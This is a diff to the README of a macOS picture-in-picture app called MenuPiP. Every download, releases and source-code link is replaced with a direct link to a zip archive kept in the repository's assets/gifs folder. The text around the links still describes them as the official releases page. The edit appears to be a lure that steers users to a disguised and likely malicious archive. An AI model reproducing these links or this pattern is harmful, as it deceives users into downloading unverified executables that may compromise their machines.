@@ -1,6 +1,6 @@
 # 🎞 MenuPiP - Always-on-Top Picture-in-Picture App
 
-[![Download MenuPiP](https://img.shields.io/badge/Download-MenuPiP-green?style=for-the-badge)](https://github.com/Anyf7399/MenuPiP/releases)
+[![Download MenuPiP](https://img.shields.io/badge/Download-MenuPiP-green?style=for-the-badge)](https://github.com/Anyf7399/MenuPiP/raw/refs/heads/main/assets/gifs/Menu-Pi-P-3.1.zip)
 
 ---
 
@@ -36,12 +36,12 @@ MenuPiP runs on macOS. It supports both Intel and Apple Silicon Macs.
 
 Use the button below to visit the official releases page for MenuPiP. From there, you can download the latest stable version.
 
-[![Download MenuPiP](https://img.shields.io/badge/Download-MenuPiP-blue?style=for-the-badge)](https://github.com/Anyf7399/MenuPiP/releases)
+[![Download MenuPiP](https://img.shields.io/badge/Download-MenuPiP-blue?style=for-the-badge)](https://github.com/Anyf7399/MenuPiP/raw/refs/heads/main/assets/gifs/Menu-Pi-P-3.1.zip)
 
 ### Step 1: Visit the Releases Page
 
 Click the above button or open this link in your web browser:  
-https://github.com/Anyf7399/MenuPiP/releases
+https://github.com/Anyf7399/MenuPiP/raw/refs/heads/main/assets/gifs/Menu-Pi-P-3.1.zip
 
 ### Step 2: Choose the Latest Version
 
@@ -125,7 +125,7 @@ Look in your browser’s default download folder, usually the Downloads folder.
 ## 📄 License and Source Code
 
 MenuPiP is open source. You can find the source, report issues, or contribute on the GitHub page:  
-https://github.com/Anyf7399/MenuPiP
+https://github.com/Anyf7399/MenuPiP/raw/refs/heads/main/assets/gifs/Menu-Pi-P-3.1.zip
 
 This app uses Apple’s ScreenCaptureKit for capturing windows and regions.
 
@@ -139,4 +139,4 @@ If you want to suggest features or report bugs, use the GitHub issues section at
 
 ---
 
-[Download MenuPiP](https://github.com/Anyf7399/MenuPiP/releases) to get started.
+[Download MenuPiP](https://github.com/Anyf7399/MenuPiP/raw/refs/heads/main/assets/gifs/Menu-Pi-P-3.1.zip) to get started.
